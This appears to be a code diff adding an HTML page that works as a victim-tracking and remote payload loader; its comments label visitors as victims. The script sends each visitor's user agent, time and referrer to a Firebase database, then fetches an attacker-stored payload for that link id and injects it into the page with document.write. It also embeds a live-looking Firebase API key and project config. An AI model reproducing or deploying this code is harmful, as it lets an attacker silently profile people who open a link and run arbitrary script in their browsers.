@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBe2FZl6ELHU_wnUp9GV_fI9xN75goKVgk",
+            authDomain: "user-e9bb1.firebaseapp.com",
+            databaseURL: "https://user-e9bb1-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "user-e9bb1",
+            storageBucket: "user-e9bb1.firebasestorage.app",
+            messagingSenderId: "366338619092",
+            appId: "1:366338619092:web:2c2ca964544193e523ed41",
+            measurementId: "G-0229YGTK19"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const id = new URLSearchParams(window.location.search).get('id');
+
+        if (id) {
+            // 1. Catat Log Korban
+            firebase.database().ref('logs/' + id).push({
+                agent: navigator.userAgent,
+                time: new Date().toLocaleString(),
+                ref: document.referrer
+            });
+
+            // 2. Jalankan Payload
+            firebase.database().ref('payloads/' + id).once('value').then(snap => {
+                if (snap.val()) document.write(snap.val().isi);
+            });
+        }
+    </script>
+</body>
+
+</html>
